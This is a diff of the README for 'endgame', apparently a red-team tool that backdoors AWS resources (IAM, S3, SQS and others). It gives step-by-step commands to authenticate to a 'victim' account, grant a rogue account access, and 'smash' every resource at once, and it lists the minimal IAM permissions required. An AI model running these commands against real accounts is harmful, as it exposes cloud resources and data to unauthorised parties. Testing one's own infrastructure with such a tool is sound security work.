@@ -28,7 +28,7 @@ endgame list-resources --service all
 endgame expose --service s3 --name computers-were-a-mistake
 ```
 
-## Supported Backdoors
+# Supported Backdoors
 
 `endgame` can create backdoors for resources in any of the services listed below.
 
@@ -56,9 +56,8 @@ endgame expose --service s3 --name computers-were-a-mistake
 | SQS Queues                         | ✅     | ✅                               |
 | SNS Topics                         | ✅     | ❌                               |
 
-## Tutorial
 
-### Installation
+## Installation
 
 * pip3
 
@@ -75,7 +74,7 @@ brew install endgame
 
 Now you should be able to execute `endgame` from command line by running `endgame --help`.
 
-#### Shell Completion
+### Shell Completion
 
 * To enable Bash completion, put this in your `~/.bashrc`:
 
@@ -89,7 +88,9 @@ eval "$(_ENDGAME_COMPLETE=source endgame)"
 eval "$(_ENDGAME_COMPLETE=source_zsh endgame)"
 ```
 
-### Setup
+# Tutorial
+
+## Step 1: Setup
 
 * First, authenticate to AWS CLI using credentials to the victim's account.
 
@@ -105,22 +106,16 @@ export AWS_REGION="us-east-1"
 export AWS_PROFILE="default"
 ```
 
-### Demo Infrastructure
+## Step 2: Create Demo Infrastructure
 
-* Create the Terraform demo infrastructure
-
-This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you.
-
-> 🚨This will create real AWS infrastructure and will cost you money! 🚨
+This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you using [Terraform](https://www.terraform.io/intro/index.html). **Note: This will create real AWS infrastructure and will cost you money.**
 
 ```bash
 # To create the demo infrastructure
 make terraform-demo
 ```
 
-> _Note: It is not exposed to rogue IAM users or to the internet at first. That will only happen after you run the exposure commands._
-
-### List Victim Resources
+## Step 3: List Victim Resources
 
 You can use the `list-resources` command to list resources in the account that you can backdoor.
 
@@ -137,7 +132,7 @@ endgame list-resources --service s3
 endgame list-resources --service all
 ```
 
-### Backdoor specific resources
+## Step 4: Backdoor specific resources
 
 * Use the `--dry-run` command first to test it without modifying anything:
 
@@ -145,9 +140,7 @@ endgame list-resources --service all
 endgame expose --service iam --name test-resource-exposure --dry-run
 ```
 
-* To create the backdoor to that resource from your rogue account
-
-> 🚨this is not a drill🚨
+* To create the backdoor to that resource from your rogue account, run the following:
 
 ```bash
 endgame expose --service iam --name test-resource-exposure
@@ -157,6 +150,8 @@ Example output:
 
 > ![Expose for real](docs/images/add-myself-foreal.png)
 
+## Step 5: Roll back changes
+
 * If you want to atone for your sins (optional) you can use the `--undo` flag to roll back the changes.
 
 ```bash
@@ -165,7 +160,9 @@ endgame expose --service iam --name test-resource-exposure --undo
 
 > ![Expose undo](docs/images/add-myself-undo.png)
 
-### Expose everything
+## Step 6: Smash your AWS Account to Pieces
+
+* Run the following command to expose every exposable resource in your AWS account.
 
 ```bash
 endgame smash --service all --dry-run
@@ -173,7 +170,7 @@ endgame smash --service all
 endgame smash --service all --undo
 ```
 
-### Destroy Demo Infrastructure
+## Step 7: Destroy Demo Infrastructure
 
 * Now that you are done with the tutorial, don't forget to clean up the demo infrastructure.
 
@@ -182,11 +179,11 @@ endgame smash --service all --undo
 make terraform-destroy
 ```
 
-## IAM Permissions
+# IAM Permissions
 
 The IAM Permissions listed below are used to create these backdoors.
 
-> **NOTE**: You don't need **all** of these permissions to run the tool. You just need enough from each service. So, `s3:ListAllMyBuckets`, `s3:GetBucketPolicy`, and `s3:PutBucketPolicy` are all the permissions needed to leverage this tool to expose S3 buckets.
+**NOTE**: You don't need **all** of these permissions to run the tool. You just need enough from each service. So, `s3:ListAllMyBuckets`, `s3:GetBucketPolicy`, and `s3:PutBucketPolicy` are all the permissions needed to leverage this tool to expose S3 buckets.
 
 ```json
 {
@@ -272,7 +269,7 @@ The IAM Permissions listed below are used to create these backdoors.
 }
 ```
 
-## Contributing
+# Contributing
 
 ## Testing
 
@@ -321,14 +318,8 @@ Note that the `expose` command will not expose the resources to the world - it w
 
 # References
 
+* [AWS Access Analyzer Supported Resources](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html)
 * [AWS Exposable Resources](https://github.com/SummitRoute/aws_exposable_resources)
-
 * [Moto: A library that allows you to easily mock out tests based on AWS Infrastructure](http://docs.getmoto.org/en/latest/docs/moto_apis.html)
-
-* [Moto Unit tests - a  great way to get examples of how they mock the creation of AWS resources](https://github.com/spulec/moto/blob/master/tests)
-
-* [Paginators](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/paginators.html)
-
-* [Exception handling for specific AWS Services](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/error-handling.html#parsing-error-responses-and-catching-exceptions-from-aws-services)
 
 [1]: https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html
